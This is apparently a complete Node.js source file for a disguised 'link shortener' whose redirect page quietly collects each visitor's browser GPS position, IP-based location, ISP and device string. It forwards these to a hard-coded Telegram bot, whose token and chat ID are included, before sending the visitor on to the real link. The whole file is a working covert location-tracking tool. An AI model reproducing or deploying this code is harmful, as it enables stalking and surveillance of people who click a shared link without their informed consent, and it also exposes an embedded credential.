const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

// أفضل طريقة IP: triple-check
async function getBestIPLocation(ip) {
  const attempts = [
    () => axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 }),
    () => axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 }),
    () => axios.get(`https://geolocation-db.com/json/${ip}`, { timeout: 3000 })
  ];

  for (let attempt of attempts) {
    try {
      const res = await attempt();
      const data = res.data;
      
      if (data.latitude && data.longitude) {
        return {
          method: '🌐 IP Geolocation',
          country: data.country || data.country_name || 'Unknown',
          city: data.city || 'N/A',
          latitude: parseFloat(data.latitude || data.lat),
          longitude: parseFloat(data.longitude || data.lon),
          accuracy: '±50-100km',
          isp: data.isp || data.org || 'Unknown'
        };
      }
    } catch (e) {
      console.log(`[IP] Attempt failed: ${e.message}`);
    }
  }

  return null;
}

// GPS من الـ browser
function parseGPS(gpsData) {
  if (!gpsData || !gpsData.latitude || !gpsData.longitude) return null;
  
  return {
    method: '📍 Browser GPS (High Accuracy)',
    latitude: parseFloat(gpsData.latitude),
    longitude: parseFloat(gpsData.longitude),
    accuracy: `±${(gpsData.accuracy || 20).toFixed(0)}m`,
    altitude: gpsData.altitude ? `${gpsData.altitude.toFixed(0)}m` : 'N/A',
    heading: gpsData.heading !== null ? `${gpsData.heading.toFixed(0)}°` : 'N/A'
  };
}

// Reverse geocoding: احول الـ lat/lng لمدينة ودولة
async function reverseGeocode(lat, lng) {
  try {
    // استخدم Nominatim (OpenStreetMap - مجاني وفقاته)
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { 
        timeout: 3000,
        headers: { 'User-Agent': 'LinkShortener/1.0' }
      }
    );
    
    if (res.data && res.data.address) {
      const addr = res.data.address;
      return {
        city: addr.city || addr.town || addr.village || 'Unknown',
        country: addr.country || 'Unknown',
        address: res.data.name || ''
      };
    }
  } catch (e) {
    console.log('[Reverse] Error:', e.message);
  }

  // Fallback: استخدم ip-api.com بـ lat/lng
  try {
    const res = await axios.get(`http://ip-api.com/json/?lat=${lat}&lon=${lng}`, { timeout: 3000 });
    if (res.data) {
      return {
        city: res.data.city || 'Unknown',
        country: res.data.country || 'Unknown',
        address: ''
      };
    }
  } catch (e) {}

  return { city: 'Unknown', country: 'Unknown', address: '' };
}

// احسب المسافة بين نقطتين (للتحقق من أن الـ GPS ليس مزيف)
function getDistance(lat1, lon1, lat2, lon2) {
  const R = 6371; // km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  return R * c;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, locationData) {
  try {
    let location = locationData.gps;
    let method = '📍 GPS';

    // اگر GPS ما جاب نتيجة، استخدم IP
    if (!location || !location.latitude) {
      location = locationData.ip;
      method = '🌐 IP';
    }

    let msg = `
🔗 <b>رابط فُتح!</b>
━━━━━━━━━━━━━━━━━━━
<b>📌 الكود:</b> <code>${shortCode}</code>
<b>🌐 الرابط:</b> ${originalUrl}
<b>🔌 IP:</b> <code>${ip}</code>
━━━━━━━━━━━━━━━━━━━
<b>✅ الطريقة:</b> ${method}
<b>🏳️ الدولة:</b> ${location.country}
<b>🏙️ المدينة:</b> ${location.city}
<b>📍 Lat:</b> <code>${location.latitude.toFixed(6)}</code>
<b>📍 Lng:</b> <code>${location.longitude.toFixed(6)}</code>
<b>📏 الدقة:</b> ${location.accuracy}
`;

    if (location.altitude) msg += `<b>⛰️ الارتفاع:</b> ${location.altitude}\n`;
    if (location.heading) msg += `<b>🧭 الاتجاه:</b> ${location.heading}\n`;
    if (location.isp) msg += `<b>🏢 ISP:</b> ${location.isp}\n`;

    msg += `
<b>🗺️ الخريطة:</b>
<a href="https://maps.google.com/?q=${location.latitude},${location.longitude}">Google Maps</a> | <a href="https://www.openstreetmap.org/?zoom=15&lat=${location.latitude}&lon=${location.longitude}">OSM</a>
━━━━━━━━━━━━━━━━━━━
<b>🖥️ Device:</b> <code>${userAgent.substring(0, 70)}</code>
<b>⏰ الوقت:</b> ${new Date().toLocaleString('ar-SA')}
    `.trim();

    const response = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { 
        chat_id: TELEGRAM_CHAT_ID, 
        text: msg,
        parse_mode: 'HTML'
      },
      { timeout: 5000 }
    );

    console.log('✅ [TG] Message sent:', response.data.result.message_id);
    return true;
  } catch (err) {
    console.error('❌ [TG]', err.message);
    return false;
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  res.json({ 
    shortened: `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`, 
    code: shortCode 
  });
});

// الـ API الأساسي: استقبل البيانات وأرسل للـ Telegram
app.post('/api/log-location', async (req, res) => {
  const { code, gps } = req.body;
  
  if (!linkStorage[code]) {
    return res.status(404).json({ error: 'Code not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;

  console.log(`[LOG] Code: ${code} | IP: ${ip} | GPS: ${gps ? 'Yes' : 'No'}`);

  // جمع البيانات
  const locationData = { gps: null, ip: null };

  // معالجة GPS
  if (gps && gps.latitude && gps.longitude) {
    const geoData = await reverseGeocode(gps.latitude, gps.longitude);
    locationData.gps = {
      method: '📍 GPS',
      latitude: gps.latitude,
      longitude: gps.longitude,
      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
      altitude: gps.altitude ? `${gps.altitude}m` : null,
      heading: gps.heading !== null ? `${gps.heading}°` : null,
      country: geoData.country,
      city: geoData.city
    };
  }

  // معالجة IP
  const ipLocation = await getBestIPLocation(ip);
  if (ipLocation) {
    locationData.ip = ipLocation;
  }

  // أرسل للـ Telegram
  await sendToTelegram(ip, code, originalUrl, userAgent, locationData);

  res.json({ success: true });
});

// الـ Redirect: لازم نروح للـ API أولاً
app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('Link not found');
  }

  const originalUrl = linkStorage[code].original;

  res.send(`
<!DOCTYPE html>
<html dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جاري التحويل...</title>
  <style>
    body { font-family: Arial; background: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .loader { text-align: center; }
    .spinner { border: 4px solid #444; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    p { font-size: 16px; }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <p>جاري التحويل للرابط...</p>
    <p id="status">جاري جمع موقعك...</p>
  </div>

  <script>
    const code = '${code}';
    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-location';
    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
    
    async function getLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          console.log('GPS not available');
          resolve(null);
          return;
        }

        const timeout = setTimeout(() => {
          console.log('GPS timeout');
          resolve(null);
        }, 5000);

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            clearTimeout(timeout);
            console.log('✅ GPS acquired:', pos.coords);
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              heading: pos.coords.heading
            });
          },
          (err) => {
            clearTimeout(timeout);
            console.log('GPS error:', err.message);
            resolve(null);
          },
          { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
        );
      });
    }

    async function main() {
      try {
        // احصل على الـ GPS
        const gps = await getLocation();
        document.getElementById('status').textContent = gps ? 'موقع متاح ✓' : 'بدون موقع (لكن سيتم استخدام IP)';

        // أرسل للـ server
        console.log('Sending to API...');
        const res = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code, gps }),
          keepalive: true
        });

        console.log('Response:', res.status);

        // الآن انتقل للـ رابط الأصلي
        setTimeout(() => {
          window.location.href = originalUrl;
        }, 500);

      } catch (err) {
        console.error('Error:', err);
        // انتقل بأي حال
        window.location.href = originalUrl;
      }
    }

    main();
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════╗
║  🚀 Server running on port ${PORT}      ║
║  🎯 Max accuracy enabled             ║
║  📍 GPS + IP + Reverse Geocoding     ║
╚══════════════════════════════════════╝
  `);
});